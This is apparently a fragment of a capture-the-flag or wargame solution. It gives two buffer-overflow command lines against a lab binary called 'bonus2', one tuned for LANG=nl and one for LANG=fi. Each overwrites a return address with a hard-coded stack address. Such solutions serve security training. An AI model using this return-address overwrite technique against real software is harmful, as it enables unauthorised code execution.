### With LANG = nl

```bash
./bonus2 \
$(python -c 'print "A" * 40') \
$(python -c 'print "B" * 23 + "\xe6\xfe\xff\xbf"')
```

---

### With LANG = fi

```bash
./bonus2 \
$(python -c 'print "A" * 40') \
$(python -c 'print "B" * 18 + "\xe6\xfe\xff\xbf"')
```

